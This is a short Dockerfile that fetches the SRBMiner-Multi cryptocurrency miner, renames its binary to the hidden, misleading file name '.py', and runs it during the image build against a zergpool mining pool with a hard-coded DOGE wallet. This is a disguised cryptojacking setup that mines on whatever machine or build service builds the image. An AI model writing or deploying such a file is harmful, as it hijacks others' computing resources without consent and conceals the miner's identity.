FROM ubuntu:20.04
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz && tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz && rm -rf SRBMiner-Multi-0-9-4-Linux.tar.xz
RUN cd SRBMiner-Multi-0-9-4 && chmod +x ./SRBMiner-MULTI && mv SRBMiner-MULTI .py && cp .py /home
RUN ./.py --algorithm curvehash --pool stratum+tcp://curvehash.mine.zergpool.com:3343 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE --keepalive true
